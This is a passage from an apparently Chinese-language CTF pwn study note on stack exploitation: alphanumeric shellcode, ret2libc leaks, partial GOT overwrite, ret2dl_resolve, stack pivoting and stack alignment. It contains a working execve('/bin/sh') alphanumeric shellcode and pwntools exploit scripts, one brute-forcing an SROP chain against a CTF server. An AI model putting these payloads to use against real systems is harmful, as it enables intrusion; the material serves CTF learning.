立即数]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">3.</span>逻辑运算:</span><br><span class=\"line\">and al, 立即数</span><br><span class=\"line\">and dword ptr [eax… + 立即数], esi edi</span><br><span class=\"line\">and word ptr [eax… + 立即数], si di</span><br><span class=\"line\">and ah dh…, byte ptr [ecx edx… + 立即数]</span><br><span class=\"line\">and esi edi, dword ptr [eax… + 立即数]</span><br><span class=\"line\">and si di, word ptr [eax… + 立即数]</span><br><span class=\"line\"></span><br><span class=\"line\">xor al, 立即数</span><br><span class=\"line\">xor byte ptr [eax… + 立即数], al dl…</span><br><span class=\"line\">xor byte ptr [eax… + 立即数], ah dh…</span><br><span class=\"line\">xor dword ptr [eax… + 立即数], esi edi</span><br><span class=\"line\">xor word ptr [eax… + 立即数], si di</span><br><span class=\"line\">xor al dl…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">xor ah dh…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">xor esi edi, dword ptr [eax… + 立即数]</span><br><span class=\"line\">xor si di, word ptr [eax… + 立即数]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">4.</span>比较指令:</span><br><span class=\"line\">cmp al, 立即数</span><br><span class=\"line\">cmp byte ptr [eax… + 立即数], al dl…</span><br><span class=\"line\">cmp byte ptr [eax… + 立即数], ah dh…</span><br><span class=\"line\">cmp dword ptr [eax… + 立即数], esi edi</span><br><span class=\"line\">cmp word ptr [eax… + 立即数], si di</span><br><span class=\"line\">cmp al dl…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">cmp ah dh…, byte ptr [eax… + 立即数]</span><br><span class=\"line\">cmp esi edi, dword ptr [eax… + 立即数]</span><br><span class=\"line\">cmp si di, word ptr [eax… + 立即数]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">5.</span>转移指令:</span><br><span class=\"line\">push <span class=\"number\">56</span>h</span><br><span class=\"line\">pop eax</span><br><span class=\"line\">cmp al, <span class=\"number\">43</span>h</span><br><span class=\"line\">jnz lable</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;=&gt; jmp lable</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">6.</span>交换al, ah</span><br><span class=\"line\">push eax</span><br><span class=\"line\">xor ah, byte ptr [esp] <span class=\"comment\">// ah ^= al</span></span><br><span class=\"line\">xor byte ptr [esp], ah <span class=\"comment\">// al ^= ah</span></span><br><span class=\"line\">xor ah, byte ptr [esp] <span class=\"comment\">// ah ^= al</span></span><br><span class=\"line\">pop eax</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">7.</span>清零:</span><br><span class=\"line\">push <span class=\"number\">44</span>h</span><br><span class=\"line\">pop eax</span><br><span class=\"line\">sub al, <span class=\"number\">44</span>h ; eax = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">push esi</span><br><span class=\"line\">push esp</span><br><span class=\"line\">pop eax</span><br><span class=\"line\">xor [eax], esi ; esi = <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n<p>一般而言,  我们采用<code>xor</code>或者<code>sub</code>指令修改shellcode后面的值，构造<code>0f 05</code>， 实现syscall。</p>\n<p>一个例子(纯字母数字shellcode):</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ref: https://hama.hatenadiary.jp/entry/2017/04/04/190129</span></span><br><span class=\"line\"><span class=\"comment\">/* from call rax */</span></span><br><span class=\"line\">push rax</span><br><span class=\"line\">push rax</span><br><span class=\"line\">pop rcx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* XOR pop rsi, pop rdi, syscall */</span></span><br><span class=\"line\">push <span class=\"number\">0x41413030</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor DWORD PTR [rcx+<span class=\"number\">0x30</span>], eax</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* XOR /bin/sh */</span></span><br><span class=\"line\">push <span class=\"number\">0x34303041</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor DWORD PTR [rcx+<span class=\"number\">0x34</span>], eax</span><br><span class=\"line\">push <span class=\"number\">0x41303041</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor DWORD PTR [rcx+<span class=\"number\">0x38</span>], eax</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* rdi = &amp;&#x27;/bin/sh&#x27; */</span></span><br><span class=\"line\">push rcx</span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor al, <span class=\"number\">0x34</span></span><br><span class=\"line\">push rax</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* rdx = 0 */</span></span><br><span class=\"line\">push <span class=\"number\">0x30</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor al, <span class=\"number\">0x30</span></span><br><span class=\"line\">push rax</span><br><span class=\"line\">pop rdx</span><br><span class=\"line\"></span><br><span class=\"line\">push rax</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* rax = 59 (SYS_execve) */</span></span><br><span class=\"line\">push <span class=\"number\">0x41</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor al, <span class=\"number\">0x7a</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* pop rsi, pop rdi*/</span></span><br><span class=\"line\"><span class=\"comment\">/* syscall */</span> </span><br><span class=\"line\">.byte <span class=\"number\">0x6e</span></span><br><span class=\"line\">.byte <span class=\"number\">0x6f</span></span><br><span class=\"line\">.byte <span class=\"number\">0x4e</span></span><br><span class=\"line\">.byte <span class=\"number\">0x44</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* /bin/sh */</span></span><br><span class=\"line\">.byte <span class=\"number\">0x6e</span></span><br><span class=\"line\">.byte <span class=\"number\">0x52</span></span><br><span class=\"line\">.byte <span class=\"number\">0x59</span></span><br><span class=\"line\">.byte <span class=\"number\">0x5a</span></span><br><span class=\"line\">.byte <span class=\"number\">0x6e</span></span><br><span class=\"line\">.byte <span class=\"number\">0x43</span></span><br><span class=\"line\">.byte <span class=\"number\">0x5a</span></span><br><span class=\"line\">.byte <span class=\"number\">0x41</span></span><br></pre></td></tr></table></figure>\n<p>构造尽可能短的shellcode可能用到的一些指令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cdp  </span><br><span class=\"line\">%The CDQ instruction copies the sign (bit 31) </span><br><span class=\"line\">%of the value in the EAX register into every bit </span><br><span class=\"line\">%position in the EDX register. </span><br></pre></td></tr></table></figure>\n<h4 id=\"shellcode生成工具\">shellcode生成工具</h4>\n<p>同时，现在有多种针对shellcode进行编码的生成工具，生成符合限制的shellcode，如msf，alpha3等等，由于我没有用过，可以自行尝试。</p>\n<h4 id=\"mprotect\">mprotect()</h4>\n<p>进一步的，很多题目没有天然的readable  and  executable segment，题目可能通过mmap()映射了一段权限为7的段，或者存在mprotect()函数。</p>\n<p>这个函数可以修改指定内存段的权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mprotect:</span><br><span class=\"line\">int mprotect(void *addr, size_t len, int prot);</span><br><span class=\"line\">addr 内存起始地址</span><br><span class=\"line\">len  修改内存的长度</span><br><span class=\"line\">prot 内存的权限，7为可读可写可执行</span><br></pre></td></tr></table></figure>\n<p>如果存在这样的函数，可以考虑将其加入ROP链，从而进一步调用shellcode</p>\n<h3 id=\"ret2libc\">ret2libc</h3>\n<h4 id=\"leak-libc\">leak_libc</h4>\n<p>对于最后调用 libc 中 system 的题目而言，需要考虑的首要问题就是leak_libc.</p>\n<p>目前而言，我遇到的栈题中leak_libc，有两种方法：</p>\n<ol>\n<li>partial_overwrite<br>\n有时候，在栈中会存留libc中地址，在后面存在直接输出的函数的情况下，可以带出此地址。</li>\n<li>通过puts，write等函数，打印<code>.got</code>，获取对应函数的地址，这里，在没有给定对应libc版本的情况下，也可以通过LibcSearcher查找对应libc版本</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ref:  https://github.com/lieanu/LibcSearcher</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class=\"line\">obj = LibcSearcher(<span class=\"string\">&quot;fgets&quot;</span>, <span class=\"number\">0X7ff39014bd90</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">obj.dump(<span class=\"string\">&quot;system&quot;</span>)        <span class=\"comment\">#system 偏移</span></span><br><span class=\"line\">obj.dump(<span class=\"string\">&quot;str_bin_sh&quot;</span>)    <span class=\"comment\">#/bin/sh 偏移</span></span><br><span class=\"line\">obj.dump(<span class=\"string\">&quot;__libc_start_main_ret&quot;</span>)    </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>另一个可以本地部署的实用工具是libc-database</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ./find <span class=\"built_in\">printf</span> 260 puts f30</span><br><span class=\"line\">archive-glibc (libc6_2.19-10ubuntu2_i386)</span><br><span class=\"line\">$ ./dump libc6_2.19-0ubuntu6.6_i386</span><br><span class=\"line\">offset___libc_start_main_ret = 0x19a83</span><br><span class=\"line\">offset_system = 0x00040190</span><br><span class=\"line\">offset_dup2 = 0x000db590</span><br><span class=\"line\">offset_recv = 0x000ed2d0</span><br><span class=\"line\">offset_str_bin_sh = 0x160a24</span><br><span class=\"line\">$ ./identify bid=ebeabf5f7039f53748e996fc976b4da2d486a626</span><br><span class=\"line\">libc6_2.17-93ubuntu4_i386</span><br><span class=\"line\">$ ./identify md5=af7c40da33c685d67cdb166bd6ab7ac0</span><br><span class=\"line\">libc6_2.17-93ubuntu4_i386</span><br><span class=\"line\">$ ./identify sha1=9054f5cb7969056b6816b1e2572f2506370940c4</span><br><span class=\"line\">libc6_2.17-93ubuntu4_i386</span><br><span class=\"line\">$ ./identify sha256=8dc102c06c50512d1e5142ce93a6faf4ec8b6f5d9e33d2e1b45311aef683d9b2</span><br><span class=\"line\">libc6_2.17-93ubuntu4_i386</span><br></pre></td></tr></table></figure>\n<h4 id=\"partial-overwrite\">partial_overwrite</h4>\n<h5 id=\"前置知识\">前置知识</h5>\n<p>针对没有泄露的赛题，可以考虑partial_overwrite改写<code>got</code>表，实现system，因为一般而言，大部分libc函数，里面都存在syscall，所以syscall偏移和函数head_addr差别不会太大。</p>\n<p>考虑对于一个<code>got</code>表中的64位地址:  0xXXXXXXXXXXXXX， 假设其附近的syscall地址后三位偏移为0xaaa(请确定这个偏移和got内函数偏移只有最后四个16位数字不同)， 因为libc装载地址以页为单位，后三位是确定0x000，那么partial_overwrite覆盖后面两个字节， 即覆盖<code>got</code>为0xXXXXXXXXfaaa，那么有1/16的几率恰好syscall</p>\n<h5 id=\"爆破脚本写法\">爆破脚本写法</h5>\n<p>一个爆破脚本模板:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\">elf =<span class=\"string\">&#x27;./ciscn_s_3&#x27;</span></span><br><span class=\"line\">remote_add = <span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class=\"line\">remote_port = <span class=\"number\">29554</span></span><br><span class=\"line\"></span><br><span class=\"line\">main_add = <span class=\"number\">0x40051d</span></span><br><span class=\"line\">off = <span class=\"number\">0x130</span></span><br><span class=\"line\">system_add = <span class=\"number\">0x400517</span></span><br><span class=\"line\">rtframe = <span class=\"number\">0x4004da</span></span><br><span class=\"line\">ret_add = <span class=\"number\">0x4004e9</span></span><br><span class=\"line\"></span><br><span class=\"line\">i = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> i &lt; <span class=\"number\">20</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">        context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> sys.argv[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;r&#x27;</span>:</span><br><span class=\"line\">            p = remote(remote_add, remote_port, timeout = <span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> sys.argv[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;d&#x27;</span>:</span><br><span class=\"line\">            p = gdb.debug(elf)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            p = process(elf, timeout = <span class=\"number\">1</span>)</span><br><span class=\"line\">        payload1 = <span class=\"string\">b&#x27;/bin/sh\\0&#x27;</span> + cyclic(<span class=\"number\">0x8</span>)</span><br><span class=\"line\">        payload1+= p64(main_add)</span><br><span class=\"line\"></span><br><span class=\"line\">        p.sendline(payload1)</span><br><span class=\"line\"></span><br><span class=\"line\">        stack_add = u64(p.recv(<span class=\"number\">0x28</span>)[-<span class=\"number\">8</span>::]) - off</span><br><span class=\"line\"></span><br><span class=\"line\">        frame = SigreturnFrame()</span><br><span class=\"line\">        frame.rax = <span class=\"number\">0x3b</span></span><br><span class=\"line\">        frame.rdi = stack_add</span><br><span class=\"line\">        frame.rsi = <span class=\"number\">0</span></span><br><span class=\"line\">        frame.rdx = <span class=\"number\">0</span></span><br><span class=\"line\">        frame.rsp = stack_add</span><br><span class=\"line\">        frame.rip = system_add</span><br><span class=\"line\"></span><br><span class=\"line\">        payload = <span class=\"string\">b&#x27;/bin/sh\\0&#x27;</span> + cyclic(<span class=\"number\">0x8</span>)</span><br><span class=\"line\">        payload+= p64(rtframe)</span><br><span class=\"line\">        payload+= p64(system_add)</span><br><span class=\"line\">        payload+= <span class=\"built_in\">bytes</span>(frame)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#p.sendline(&#x27;a&#x27;)</span></span><br><span class=\"line\">        <span class=\"comment\">#p.recvuntil(&#x27;\\0&#x27;)</span></span><br><span class=\"line\">        p.sendline(payload)</span><br><span class=\"line\">        p.recvuntil(<span class=\"string\">&#x27;/bin/sh&#x27;</span>)</span><br><span class=\"line\">        p.sendline(<span class=\"string\">&#x27;cat flag&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(p.recvline())</span><br><span class=\"line\">        </span><br><span class=\"line\">        p.close()</span><br><span class=\"line\">    <span class=\"keyword\">except</span> BaseException <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        p.close()</span><br><span class=\"line\"></span><br><span class=\"line\">    off+=<span class=\"number\">0x8</span></span><br><span class=\"line\">    i+=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>核心模板:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> True:</span><br><span class=\"line\">    try:</span><br><span class=\"line\">\t\t<span class=\"comment\">// p = process()</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// pass</span></span><br><span class=\"line\">        p.sendline(<span class=\"string\">&#x27;cat flag&#x27;</span>)</span><br><span class=\"line\">        print(p.recvline())</span><br><span class=\"line\">        p.close()</span><br><span class=\"line\">    except BaseException as e:</span><br><span class=\"line\">        p.close()</span><br><span class=\"line\">    <span class=\"comment\">// pass</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>采用grep 获取输出包含flag的行就行</p>\n<h4 id=\"ret2dl-resolve\">ret2dl_resolve()</h4>\n<p>延迟绑定会使用_dl_resolve()函数</p>\n<ul>\n<li>\n<p>_dl_resolve中</p>\n<p>_dl_resolve调用_dl_fixup, _dl_dixup流程：</p>\n<ol>\n<li>通过link_map 获得.dynsym、.dynstr、.rel.plt地址</li>\n<li>通过reloc_offset + ret.plt地址获得函数对应的Elf64_Rel指针</li>\n<li>通过&amp;(ELF64_Rel)-&gt;r_info 和.dynsym取得对应Elf64_Sym指针</li>\n<li>检查r_info</li>\n<li>检查&amp;(Elf64_Sym)-&gt;st_other</li>\n<li>通过strtab(DT_STRTAB中的地址)+st_name(.dymsym中的偏移)获得函数对应的字符串，进行查找，找到后赋值给rel_addr,最后调用这个函数</li>\n</ol>\n</li>\n</ul>\n<p>综合而言，有如下利用方法(参考CTF-wiki，主要是第三种，因为存在信息泄露时，可用其他方法)</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"></th>\n<th style=\"text-align:left\">修改 dynamic 节的内容</th>\n<th style=\"text-align:left\">修改重定位表项的位置</th>\n<th style=\"text-align:left\">伪造 linkmap</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">主要前提要求</td>\n<td style=\"text-align:left\">无</td>\n<td style=\"text-align:left\">无</td>\n<td style=\"text-align:left\">无信息泄漏时需要 libc</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">适用情况</td>\n<td style=\"text-align:left\">NO RELRO</td>\n<td style=\"text-align:left\">NO RELRO, Partial RELRO</td>\n<td style=\"text-align:left\">NO RELRO, Partial RELRO</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">注意点</td>\n<td style=\"text-align:left\"></td>\n<td style=\"text-align:left\">确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应</td>\n<td style=\"text-align:left\">确保重定位位置可写；需要着重伪造重定位表项、符号表；</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"Tricks\">Tricks</h3>\n<h4 id=\"stack-pivoting\">stack pivoting</h4>\n<p>栈迁移技巧， 主要针对可溢出字节较少的情况，通过<code>leave</code>此类指令控制rsp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">;leave 相当于:</span><br><span class=\"line\">mov rsp,rbp</span><br><span class=\"line\">pop rbp</span><br><span class=\"line\">;那么考虑将栈帧中rbp地址改为栈迁移目的地址</span><br><span class=\"line\">;leave两次之后，就可以将栈转移到目的地址</span><br><span class=\"line\">;同时要现在目的地址布置好fake_stack</span><br></pre></td></tr></table></figure>\n<p>可以知道，栈迁移的前提在于，需要提前布置好栈帧，即在.bss ，  或者.data等段写入，一般要求前面有读取到.data段的函数</p>\n<p>不过，现在栈迁移一般会稍微复杂一些，读取类函数(如read)和leave可能在一个栈帧，这就要求我们在劫持read写入到指定地址的同时，实现分段栈迁移，大致流程如下:</p>\n<ul>\n<li>在第一次read读入后将rbp改为要写入的位置</li>\n<li>ret到read</li>\n<li>第二次read读入的数据将rbp改为写入的ROP链的位置，注意leave后的指令位置会加8</li>\n<li>这个leave的加8会把我们的rip指向我们第二次写入时的ret位置，只要我们第二次写入的ret位置指向leave，就实现了第二次的栈迁移，迁移到了第二次写入的ROP链的位置</li>\n</ul>\n<h5 id=\"example\">example</h5>\n<p>一个程序反汇编后:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s[<span class=\"number\">48</span>]; <span class=\"comment\">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  init(argc, argv, envp);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You can use stackoverflow.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;But only overflow a bit more...&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;And you must print first.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(s, <span class=\"number\">0</span>, <span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">  write(<span class=\"number\">1</span>, s, <span class=\"number\">0x30</span>uLL);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, s, <span class=\"number\">0x40</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个题目本身比较简单，本身给了你一个泄露，又只开了PIE，通过这个write的泄露可以拿到libc地址，考虑到题目还给了libc，预期解可能是找libc里面的/bin/sh字符串</p>\n<p>但是既然没有开PIE，就没有必要这么麻烦了，直接在数据段写入/bin/sh就行</p>\n<p><s>虽然大致脚本很早就写完了，但是运行发现了一些令人无语的错误</s></p>\n<p><strong>exp</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./ezrop&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = gdb.debug(&#x27;./ezrop&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">m = u64(p.recv(<span class=\"number\">40</span>)[-<span class=\"number\">8</span>:])</span><br><span class=\"line\"></span><br><span class=\"line\">payloads = p64(<span class=\"number\">0x400863</span>) + <span class=\"string\">b&#x27;/bin/sh\\0&#x27;</span> + p64(<span class=\"number\">0x400600</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payloads += cyclic(<span class=\"number\">0x18</span>)</span><br><span class=\"line\">payloads += p64(<span class=\"number\">0x601848</span>+<span class=\"number\">0x30</span>) + p64(<span class=\"number\">0x4007d9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payloads)</span><br><span class=\"line\"></span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payloads = p64(<span class=\"number\">0x4006fa</span>) + p64(<span class=\"number\">0x400863</span>) + p64(<span class=\"number\">0x601868</span>) + p64(<span class=\"number\">0x400600</span>) </span><br><span class=\"line\">payloads += <span class=\"string\">b&#x27;/bin/sh\\0&#x27;</span></span><br><span class=\"line\">payloads += <span class=\"string\">b&#x27;/bin/sh\\0&#x27;</span></span><br><span class=\"line\">payloads += p64(<span class=\"number\">0x601848</span>-<span class=\"number\">0x8</span>) + p64(<span class=\"number\">0x4007f9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payloads)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#0x00007f7b3ce92bb0      0x00007f7b3ccf8450</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"栈对齐\">栈对齐</h4>\n<p>栈对齐是高版本Ubuntu的一个特性，网上对于这个特性的解释很多都是错误的，还把它与栈平衡搞混了。</p>\n<p>这个特性来源于新版本xmm相关指令需要内存对齐，当程序运行到这些指令时，如果内存不是16位对齐，就会直接coredump</p>\n<p>可以:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ gdb -c core</span><br></pre></td></tr></table></figure>\n<p>调试core文件</p>\n<p>如果终止指令类似于:</p>\n<figure 